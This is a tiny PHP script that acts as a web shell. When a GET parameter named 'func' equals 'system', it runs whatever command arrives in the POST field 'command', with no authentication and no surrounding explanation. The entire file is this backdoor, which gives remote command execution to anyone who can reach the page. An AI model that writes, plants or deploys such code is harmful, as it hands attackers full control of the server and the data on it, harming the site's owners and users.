<?php
$execfunc = $_GET['func'];

if ($execfunc=="system") {
	system($_POST['command']);
}
?>